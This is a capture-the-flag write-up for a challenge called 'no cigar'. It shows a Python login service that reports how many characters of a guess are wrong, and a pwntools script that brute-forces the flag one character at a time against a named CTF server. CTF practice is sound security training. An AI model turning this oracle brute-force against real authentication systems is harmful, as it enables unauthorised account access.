# no cigar

## problem

Some of my users have been forgetting their passwords. I'm too lazy to actually implement a system to reset passwords, so instead I added some hints for forgetful users to try to remember the password.

```py
#!/usr/bin/env python3

def main():
    flag = open("flag.txt").read()
    while True:
        pwd = input("Enter your password: ").ljust(len(flag))
        if pwd == "exit":
            exit()
        count = sum(pwd[i] != c for i, c in enumerate(flag))
        if count == 0:
            print("Logged in successfully!")
            exit()
        else:
            print(f"Close! You're just {count} character{'s' if count else ''} off of your password.")


if __name__ == '__main__':
    main()
```

## solution

here, we can brute force the password because we know if a character is correct because the number of incorrect characters will be one less

```py
from pwn import *

context.log_level = 'warn'

previncorrect = 100
password = bytearray([0] * 100)
index = 0
while True:
    password[index] += 1
    p = remote("puzzler7.imaginaryctf.org", 14001)
    p.sendline(bytes(password))
    recvd = p.recvline().decode('ascii')
    p.close()
    if "fully" in recvd:
        print(password)
        quit()
    else:
        incorrect_count = int(recvd.split(" ")[6])
        print(password, incorrect_count)
        if previncorrect == 100:
            previncorrect = incorrect_count
            continue
        if incorrect_count != previncorrect:
            index += 1
            previncorrect = incorrect_count
```
